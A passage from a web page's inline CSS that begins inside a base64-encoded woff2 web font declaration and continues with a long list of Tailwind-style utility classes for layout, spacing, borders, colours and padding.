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) format("woff2");
          unicode-range: u+00??, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da, u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215, u+feff, u+fffd
        }

        .visible {
          visibility: visible
        }

        .invisible {
          visibility: hidden
        }

        .static {
          position: static
        }

        .fixed {
          position: fixed
        }

        .absolute {
          position: absolute
        }

        .relative {
          position: relative
        }

        .left-8 {
          left: 2em
        }

        .right-0 {
          right: 0
        }

        .right-2 {
          right: .5em
        }

        .top-1 {
          top: .25em
        }

        .top-22\.5 {
          top: 5.625em
        }

        .mx-2 {
          margin-left: .5em;
          margin-right: .5em
        }

        .mx-auto {
          margin-left: auto;
          margin-right: auto
        }

        .my-2 {
          margin-bottom: .5em;
          margin-top: .5em
        }

        .my-4 {
          margin-bottom: 1em;
          margin-top: 1em
        }

        .my-8 {
          margin-bottom: 2em;
          margin-top: 2em
        }

        .mb-1 {
          margin-bottom: .25em
        }

        .mb-10 {
          margin-bottom: 2.5em
        }

        .mb-11 {
          margin-bottom: 2.75em
        }

        .mb-12 {
          margin-bottom: 3em
        }

        .mb-2 {
          margin-bottom: .5em
        }

        .mb-3 {
          margin-bottom: .75em
        }

        .mb-4 {
          margin-bottom: 1em
        }

        .mb-8 {
          margin-bottom: 2em
        }

        .ml-0 {
          margin-left: 0
        }

        .ml-0\.5 {
          margin-left: .125em
        }

        .ml-1 {
          margin-left: .25em
        }

        .ml-2 {
          margin-left: .5em
        }

        .ml-auto {
          margin-left: auto
        }

        .mr-1 {
          margin-right: .25em
        }

        .mr-2 {
          margin-right: .5em
        }

        .mt-1 {
          margin-top: .25em
        }

        .mt-1\.5 {
          margin-top: .375em
        }

        .mt-12 {
          margin-top: 3em
        }

        .mt-2 {
          margin-top: .5em
        }

        .mt-3 {
          margin-top: .75em
        }

        .mt-4 {
          margin-top: 1em
        }

        .mt-5 {
          margin-top: 1.25em
        }

        .mt-6 {
          margin-top: 1.5em
        }

        .mt-\[18px\] {
          margin-top: 18px
        }

        .line-clamp-1 {
          display: -webkit-box;
          overflow: hidden;
          -webkit-box-orient: vertical;
          -webkit-line-clamp: 1
        }

        .block {
          display: block
        }

        .inline-block {
          display: inline-block
        }

        .inline {
          display: inline
        }

        .flex {
          display: flex
        }

        .inline-flex {
          display: inline-flex
        }

        .grid {
          display: grid
        }

        .hidden {
          display: none
        }

        .h-3 {
          height: .75em
        }

        .h-4 {
          height: 1em
        }

        .h-5 {
          height: 1.25em
        }

        .h-6 {
          height: 1.5em
        }

        .h-8 {
          height: 2em
        }

        .h-\[128px\] {
          height: 128px
        }

        .h-\[1px\] {
          height: 1px
        }

        .h-full {
          height: 100%
        }

        .min-h-full {
          min-height: 100%
        }

        .w-3 {
          width: .75em
        }

        .w-36 {
          width: 9em
        }

        .w-4 {
          width: 1em
        }

        .w-40 {
          width: 10em
        }

        .w-48 {
          width: 12em
        }

        .w-5 {
          width: 1.25em
        }

        .w-54 {
          width: 13.5em
        }

        .w-6 {
          width: 1.5em
        }

        .w-8 {
          width: 2em
        }

        .w-\[128px\] {
          width: 128px
        }

        .w-\[13\.3em\] {
          width: 13.3em
        }

        .w-full {
          width: 100%
        }

        .w-min {
          width: min-content
        }

        .min-w-26 {
          min-width: 6.5em
        }

        .min-w-30 {
          min-width: 7.5em
        }

        .min-w-\[94px\] {
          min-width: 94px
        }

        .max-w-\[180px\] {
          max-width: 180px
        }

        .max-w-\[423px\] {
          max-width: 423px
        }

        .flex-shrink-0 {
          flex-shrink: 0
        }

        .flex-grow {
          flex-grow: 1
        }

        .transform {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .cursor-default {
          cursor: default
        }

        .cursor-not-allowed {
          cursor: not-allowed
        }

        .cursor-pointer {
          cursor: pointer
        }

        .grid-cols-\[1rem_1fr\] {
          grid-template-columns: 1em 1fr
        }

        .flex-row {
          flex-direction: row
        }

        .flex-col {
          flex-direction: column
        }

        .flex-nowrap {
          flex-wrap: nowrap
        }

        .place-content-start {
          place-content: start
        }

        .items-start {
          align-items: flex-start
        }

        .items-center {
          align-items: center
        }

        .justify-start {
          justify-content: flex-start
        }

        .justify-end {
          justify-content: flex-end
        }

        .justify-center {
          justify-content: center
        }

        .justify-between {
          justify-content: space-between
        }

        .gap-1 {
          gap: .25em
        }

        .gap-x-0 {
          column-gap: 0
        }

        .gap-x-0\.5 {
          column-gap: .125em
        }

        .gap-x-2 {
          column-gap: .5em
        }

        .gap-x-6 {
          column-gap: 1.5em
        }

        .gap-y-0 {
          row-gap: 0
        }

        .gap-y-0\.5 {
          row-gap: .125em
        }

        .gap-y-1 {
          row-gap: .25em
        }

        .gap-y-1\.5 {
          row-gap: .375em
        }

        .gap-y-2 {
          row-gap: .5em
        }

        .gap-y-4 {
          row-gap: 1em
        }

        .gap-y-6 {
          row-gap: 1.5em
        }

        .space-x-1>:not([hidden])~:not([hidden]) {
          --tw-space-x-reverse: 0;
          margin-left: calc(.25em*(1 - var(--tw-space-x-reverse)));
          margin-right: calc(.25em*var(--tw-space-x-reverse))
        }

        .space-x-2>:not([hidden])~:not([hidden]) {
          --tw-space-x-reverse: 0;
          margin-left: calc(.5em*(1 - var(--tw-space-x-reverse)));
          margin-right: calc(.5em*var(--tw-space-x-reverse))
        }

        .space-x-4>:not([hidden])~:not([hidden]) {
          --tw-space-x-reverse: 0;
          margin-left: calc(1em*(1 - var(--tw-space-x-reverse)));
          margin-right: calc(1em*var(--tw-space-x-reverse))
        }

        .space-y-0>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(0px*var(--tw-space-y-reverse));
          margin-top: calc(0px*(1 - var(--tw-space-y-reverse)))
        }

        .space-y-0\.5>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(.125em*var(--tw-space-y-reverse));
          margin-top: calc(.125em*(1 - var(--tw-space-y-reverse)))
        }

        .space-y-1>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(.25em*var(--tw-space-y-reverse));
          margin-top: calc(.25em*(1 - var(--tw-space-y-reverse)))
        }

        .space-y-2>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(.5em*var(--tw-space-y-reverse));
          margin-top: calc(.5em*(1 - var(--tw-space-y-reverse)))
        }

        .space-y-4>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(1em*var(--tw-space-y-reverse));
          margin-top: calc(1em*(1 - var(--tw-space-y-reverse)))
        }

        .space-y-6>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(1.5em*var(--tw-space-y-reverse));
          margin-top: calc(1.5em*(1 - var(--tw-space-y-reverse)))
        }

        .place-self-center {
          place-self: center
        }

        .self-center {
          align-self: center
        }

        .self-stretch {
          align-self: stretch
        }

        .justify-self-start {
          justify-self: start
        }

        .justify-self-center {
          justify-self: center
        }

        .overflow-hidden {
          overflow: hidden
        }

        .overflow-y-auto {
          overflow-y: auto
        }

        .truncate {
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap
        }

        .rounded {
          border-radius: .25em
        }

        .rounded-lg {
          border-radius: .5em
        }

        .rounded-md {
          border-radius: .375em
        }

        .rounded-xl {
          border-radius: .75em
        }

        .border {
          border-width: 1px
        }

        .border-2 {
          border-width: 2px
        }

        .border-t {
          border-top-width: 1px
        }

        .\!border-caution {
          border-color: rgb(var(--background-caution)) !important
        }

        .border-black {
          border-color: rgb(var(--black-fixed))
        }

        .border-card-soft {
          border-color: rgb(var(--stroke-card-soft))
        }

        .border-gray-500 {
          --tw-border-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-border-opacity))
        }

        .border-gray-600 {
          --tw-border-opacity: 1;
          border-color: rgb(224 224 224/var(--tw-border-opacity))
        }

        .bg-gray-100 {
          --tw-bg-opacity: 1;
          background-color: rgb(241 241 241/var(--tw-bg-opacity))
        }

        .bg-gray-150 {
          --tw-bg-opacity: 1;
          background-color: rgb(246 246 246/var(--tw-bg-opacity))
        }

        .bg-gray-175 {
          --tw-bg-opacity: 1;
          background-color: rgb(249 249 249/var(--tw-bg-opacity))
        }

        .bg-gray-600 {
          --tw-bg-opacity: 1;
          background-color: rgb(224 224 224/var(--tw-bg-opacity))
        }

        .bg-low {
          background-color: rgb(var(--background-low))
        }

        .bg-white {
          background-color: rgb(var(--white-fixed))
        }

        .fill-grey-black {
          fill: rgb(var(--fill-grey-black))
        }

        .fill-primary-accent-foreground {
          fill: rgb(var(--text-accent-primary))
        }

        .fill-white {
          fill: rgb(var(--white-fixed))
        }

        .stroke-grey-black {
          stroke: rgb(var(--fill-grey-black))
        }

        .p-0 {
          padding: 0
        }

        .p-1 {
          padding: .25em
        }

        .p-2 {
          padding: .5em
        }

        .p-4 {
          padding: 1em
        }

        .p-6 {
          padding: 1.5em
        }

        .px-0 {
          padding-left: 0;
          padding-right: 0
        }

        .px-14 {
          padding-left: 3.5em;
          padding-right: 3.5em
        }

        .px-16 {
          padding-left: 4em;
          padding-right: 4em
        }

        .px-2 {
          padding-left: .5em;
          padding-right: .5em
        }

        .px-4 {
          padding-left: 1em;
          padding-right: 1em
        }

        .px-6 {
          padding-left: 1.5em;
          padding-right: 1.5em
        }

        .px-7 {
          padding-left: 1.75em;
          padding-right: 1.75em
        }

        .px-8 {
          padding-left: 2em;
          padding-right: 2em
        }

        .px-9 {
          padding-left: 2.25em;
          padding-right: 2.25em
        }

        .py-0 {
          padding-bottom: 0;
          padding-top: 0
        }

        .py-0\.5 {
          padding-bottom: .125em;
          padding-top: .125em
        }

        .py-1 {
          padding-bottom: .25em;
          padding-top: .25em
        }

        .py-1\.5 {
          padding-bottom: .375em;
          padding-top: .375em
        }

        .py-2 {
          padding-bottom: .5em;
          padding-top: .5em
        }

        .py-2\.5 {
          padding-bottom: .625em;
          padding-top: .625em
        }

        .py-20 {
          padding-bottom: 5em;
          padding-top: 5em
